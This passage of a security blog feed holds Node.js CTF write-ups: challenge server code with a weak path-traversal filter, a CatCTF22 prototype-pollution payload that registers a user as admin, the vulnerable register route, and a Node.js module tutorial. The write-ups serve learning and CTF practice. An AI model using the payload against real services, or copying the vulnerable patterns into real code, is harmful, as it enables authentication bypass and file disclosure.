class="attr">message</span>: <span class="string">&#x27;Login Successfully&#x27;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;Errow Password!&#x27;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;This Website Only Open for admin&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;Error decrypting password!&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/ExP0rtApi&#x27;</span>, verifyAdmin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> rootpath = req.<span class="property">query</span>.<span class="property">v</span>;</span><br><span class="line">  <span class="keyword">var</span> file = req.<span class="property">query</span>.<span class="property">f</span>;</span><br><span class="line"></span><br><span class="line">  file = file.<span class="title function_">replace</span>(<span class="regexp">/\.\.\//g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  rootpath = rootpath.<span class="title function_">replace</span>(<span class="regexp">/\.\.\//g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(rootpath === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(file === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;try to find parameters HaHa&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      rootpath = <span class="string">&quot;static&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, rootpath + <span class="string">&quot;/&quot;</span> + file);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(filePath)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;File not found&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fs.<span class="title function_">readFile</span>(filePath, <span class="function">(<span class="params">err, fileData</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error reading file:&#x27;</span>, err);</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    zlib.<span class="title function_">gzip</span>(fileData, <span class="function">(<span class="params">err, compressedData</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error compressing file:&#x27;</span>, err);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error compressing file&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> base64Data = compressedData.<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">      res.<span class="title function_">send</span>(base64Data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/report&quot;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&quot;/static/report_noway_dirsearch.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/report&quot;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;user, date, reportmessage&#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Reportcache</span>[user] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="title class_">Reportcache</span>[user] = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">Reportcache</span>[user][date] = reportmessage</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Report Success&#x27;);window.location.href=&#x27;/report&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/countreport&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> user <span class="keyword">in</span> <span class="title class_">Reportcache</span>) &#123;</span><br><span class="line">    count += <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Reportcache</span>[user]).<span class="property">length</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; count &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看当前运行用户</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/VanZY_s_T3st&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> command = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> cmd = cp.<span class="title function_">spawn</span>(command ,[]);</span><br><span class="line">  cmd.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">end</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running on http://localhost:3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;body-parser&quot;</span>: <span class="string">&quot;^1.20.3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cookie-parser&quot;</span>: <span class="string">&quot;^1.4.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;crypto&quot;</span>: <span class="string">&quot;^1.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;express&quot;</span>: <span class="string">&quot;^4.21.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jsonwebtoken&quot;</span>: <span class="string">&quot;^9.0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mysql&quot;</span>: <span class="string">&quot;^2.18.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;node-rsa&quot;</span>: <span class="string">&quot;^1.1.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;^0.12.7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;require-in-the-middle&quot;</span>: <span class="string">&quot;^7.4.0&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// handle/index.js</span></span><br><span class="line"><span class="keyword">var</span> ritm = <span class="built_in">require</span>(<span class="string">&#x27;require-in-the-middle&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> patchChildProcess = <span class="built_in">require</span>(<span class="string">&#x27;./child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> ritm.<span class="title class_">Hook</span>(</span><br><span class="line">    [<span class="string">&#x27;child_process&#x27;</span>],</span><br><span class="line">    <span class="keyword">function</span> (<span class="params"><span class="variable language_">module</span>, name</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (name) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;child_process&#x27;</span>: &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">patchChildProcess</span>(<span class="variable language_">module</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// handle/child_process.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">patchChildProcess</span>(<span class="params">cp</span>) &#123;</span><br><span class="line"></span><br><span class="line">    cp.<span class="property">execFile</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">execFile</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">fork</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">fork</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">spawn</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">spawn</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">execFileSync</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">execFileSync</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">execSync</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">execSync</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>() &#125;);</span><br><span class="line">    cp.<span class="property">spawnSync</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">spawnSync</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">patchOptions</span>(<span class="params">hasArgs</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">apply</span>(<span class="params">target, thisArg, args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> pos = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (pos === args.<span class="property">length</span>) &#123;</span><br><span class="line">            args[pos] = <span class="title function_">prototypelessSpawnOpts</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pos &lt; args.<span class="property">length</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hasArgs &amp;&amp; (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(args[pos]) || args[pos] == <span class="literal">null</span>)) &#123;</span><br><span class="line">                pos++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> args[pos] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; args[pos] !== <span class="literal">null</span>) &#123;</span><br><span class="line">                args[pos] = <span class="title function_">prototypelessSpawnOpts</span>(args[pos]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (args[pos] == <span class="literal">null</span>) &#123;</span><br><span class="line">                args[pos] = <span class="title function_">prototypelessSpawnOpts</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> args[pos] === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">                args.<span class="title function_">splice</span>(pos, <span class="number">0</span>, <span class="title function_">prototypelessSpawnOpts</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> target.<span class="title function_">apply</span>(thisArg, args);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">prototypelessSpawnOpts</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> prototypelessObj = <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), obj);</span><br><span class="line">    prototypelessObj.<span class="property">env</span> = <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), prototypelessObj.<span class="property">env</span> || process.<span class="property">env</span>);</span><br><span class="line">    <span class="keyword">return</span> prototypelessObj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = patchChildProcess;</span><br></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>这个博客作者没有仔细看前端代码跑去爆破了<a href="https://xz.aliyun.com/t/15785?time__1311=GqjxnQGQDQoCqGXPeewqQuRDfg/YtDgCaoD#toc-1">详细题解1 有中间思路</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> rce </tag>
            
            <tag> node pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wife_CatCTF22</title>
      <link href="/2024/11/01/wife_CatCTF22/"/>
      <url>/2024/11/01/wife_CatCTF22/</url>
      
        <content type="html"><![CDATA[<blockquote><p>黑盒原型链污染，原型链污染绕过身份验证</p></blockquote><h2 id="分析与尝试-DONE"><a href="#分析与尝试-DONE" class="headerlink" title="分析与尝试 DONE"></a>分析与尝试 DONE</h2><ol><li><p>注意到服务端使用node express框架，可以故意报错搞点信息，比如多谢一个段等</p></li><li><p>先看看node这边的漏洞试试，现在就是要登录为admin用户，猜测flag在admin中，有两个思路</p><ol><li>获取admin的账号与密码</li><li>node相关的可能是原型链污染？服务端<ol><li>admin直接登录，服务端一般会保存一个存有用户信息的对象，这里如果对于普通用户没有设置admin就可能通过原型链进行覆盖(直接clone的话)，如果有设置admin&#x3D;false那就不行 -&gt; 比2有可能，都试试，先这个，<strong>但是这里试试去掉isAdmin&#x3D;false是可以的</strong>，可以从第二种情况去到第一种情况</li><li>注册一个admin用户，这个code涉及到邀请码(不是验证码)的设计，考虑一般和数据库相关，原型链覆盖也无从下手 -&gt; 如果是对象的话在Object处进行覆盖是无法通过原型链访问到的，因为自己就有<strong>可能性不大</strong></li></ol></li></ol></li><li><p>确定先通过admin直接登录探测，下一步就是要找到键了，发现在注册中有一个isAdmin会不会在邀请码对的时候进行clone？试试，想要直接登录的话还是要先注册，普通注册+原型链污染</p></li><li><p>最终payload</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /register <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;h4ck3r&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;aaa&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;isAdmin&quot;</span>:<span class="literal">true</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="题解白盒一下"><a href="#题解白盒一下" class="headerlink" title="题解白盒一下"></a>题解白盒一下</h2><ol><li><em><strong>注意点就是Object.assign()在JSON.parse()下存在原型链污染</strong></em></li><li>可以多多fuzz</li><li><a href="https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/">官方题解的源码</a></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span> (!user.<span class="property">username</span> || !user.<span class="property">password</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;empty username or password&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">filter</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> == user.<span class="property">username</span>).<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;username already exists&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (user.<span class="property">isAdmin</span> &amp;&amp; user.<span class="property">inviteCode</span> != <span class="variable constant_">INVITE_CODE</span>) &#123;</span><br><span class="line">        user.<span class="property">isAdmin</span> = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;invalid invite code&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> newUser = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, baseUser, user)</span><br><span class="line">    users.<span class="title function_">push</span>(newUser)</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;user created successfully&#x27;</span>, <span class="attr">err</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> node pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NodejsS3c</title>
      <link href="/2024/10/30/NodejsS3c/"/>
      <url>/2024/10/30/NodejsS3c/</url>
      
        <content type="html"><![CDATA[<h2 id="Nodejs前置知识"><a href="#Nodejs前置知识" class="headerlink" title="Nodejs前置知识"></a>Nodejs前置知识</h2><h3 id="CJS-and-EJS"><a href="#CJS-and-EJS" class="headerlink" title="CJS and EJS"></a>CJS and EJS</h3><ol><li><p>CJS（CommonJS）模块和ES6（ECMAScript 2015）模块是JavaScript中两种不同的模块化系统，它们各自有不同的语法和加载机制</p><ol><li>兼容性: 不是所有环境都支持ES6模块，有时需要使用转码器如Babel将ES6代码转换成向后兼容的版本</li></ol></li><li><p>CJS</p><ol><li><strong>同步加载</strong>: 在Node.js环境中，CommonJS模块是同步加载的。这意味着，在执行当前文件代码之前，所有通过 require 加载的依赖都会被解析并执行</li><li>使用场景: 非常适合服务器端应用，因为服务器端通常不需要考虑加载时间的影响</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 模块操作: require和exports</span></span><br><span class="line"><span class="comment">// 导出</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">bar</span> = <span class="string">&#x27;baz&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">const</span> myModule = <span class="built_in">require</span>(<span class="string">&#x27;./myModule&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>ES6</p><ol><li><strong>异步加载</strong>: 异步加载的</li><li><strong>静态</strong>: ES6模块的设计是静态的，即模块的依赖关系必须在编译时确定，这允许工具进行优化，如tree shaking等</li><li>使用场景: 适合现代Web应用，特别是单页应用程序（SPA），以及任何希望利用最新JavaScript特性的项目</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// import和export</span></span><br><span class="line"><span class="comment">// 导出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> foo = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">baz</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">const</span> bar = <span class="string">&#x27;baz&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">qux</span> = (<span class="params"></span>) =&gt; &#123;&#125;;</span><br><span class="line"><span class="keyword">export</span> &#123; bar, qux &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">import</span> &#123; foo, baz &#125; <span class="keyword">from</span> <span class="string">&#x27;./myModule&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> myModule <span class="keyword">from</span> <span class="string">&#x27;./myModule&#x27;</span>; <span class="comment">// 导入整个模块</span></span><br></pre></td></tr></table></figure></li><li><p><strong>分辨</strong></p><ol><li>CommonJS模块和ES6模块的不同可以体现在package.json的type字段，当type字段为空或者为”commonjs”时，当前目录下的.js脚本会解释成CommonJS模块，如果type字段为module,.js解释为ES模块</li></ol></li></ol><h3 id="module-in-CJS"><a href="#module-in-CJS" class="headerlink" title="module in CJS"></a>module in CJS</h3><ol><li><p><strong>什么是模块</strong>: 在Node.js中，模块是指一个文件或一组文件，其中定义了一组相关的函数、变量和对象，以便可以重复使用 -&gt; 每个文件都被视为一个模块，文件路径就是模块名</p></li><li><p><strong>使用模块</strong></p><ol><li><p><strong>加载</strong>: 使用require函数可以加载模块并访问其内容，<code>require()</code>: 这是一个全局函数，用来加载模块。当调用require时，Node.js会查找指定的模块并执行其代码，然后返回该模块的导出对象；</p><ol><li>返回值：<code>require()</code>函数返回<code>module.exports</code>对象</li><li>module.exports：这是一个对象，可以通过赋值给它来导出模块中的内容。<em>默认情况下它是一个空对象</em><ol><li>如果只需要导出一个函数、对象或其他值，可以直接将其赋值给 module.exports</li><li>如果需要导出多个函数或对象，可以将它们作为属性添加到 module.exports 对象中</li></ol></li></ol></li><li><p><strong>共享</strong>: 通过module.exports将模块内的成员共享出去，每个Node.js文件都有一个module变量，<code>module.exports</code>对象用于公开模块中的函数、对象或值，以便它们可以在其他模块中使用。代表当前模块 –&gt; 这里指定add是模块中的add函数这样</p><ol><li>当需要模块时，分配给module.exports的任何内容都可用。</li><li><strong>exports赋值问题</strong><ol><li><code>exports</code>: 是 module.exports 的一个引用， 当你向 exports 添加属性或方法时，你实际上是在修改 module.exports</li><li>如果直接给 exports 赋予一个新的值（比如另一个对象），那么此时 exports 就不再是 module.exports 的引用了，但是不影响 module.exports</li><li>要影响 module.exports 需要直接进行修改</li><li><strong>最佳实践</strong>: exports 应该用来添加属性或方法，而不是重新赋值整个对象。如果你需要替换整个 module.exports 对象，请直接使用 module.exports</li></ol></li></ol>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">subtract</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 导出函数</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">add</span>: add,</span><br><span class="line">  <span class="attr">subtract</span>: subtract</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">const</span> math = <span class="built_in">require</span>(<span class="string">&#x27;./math&#x27;</span>); <span class="comment">// 加载本地模块</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="title function_">add</span>(<span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 输出 5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="title function_">subtract</span>(<span class="number">5</span>, <span class="number">3</span>)); <span class="comment">// 输出 2</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>缓存</strong>: 当加载模块时，它会被缓存以提高性能；对同一模块的后续require调用将返回缓存的实例，确保该模块仅执行一次</p></li><li><p><strong>module type</strong></p><ol><li>核心模块：这些是由Node.js提供的内置模块，可以直接被<code>require()</code>函数调用，无需安装</li><li>本地模块：这些是你自己创建的文件或者项目中的文件。你可以定义自己的功能并通过exports对象来暴露它们</li><li>第三方模块：这些是从npm (Node Package Manager) 安装的外部库。npm拥有世界上最大的软件注册表，包含了无数个开源包，几乎可以满足任何开发需求 –&gt; 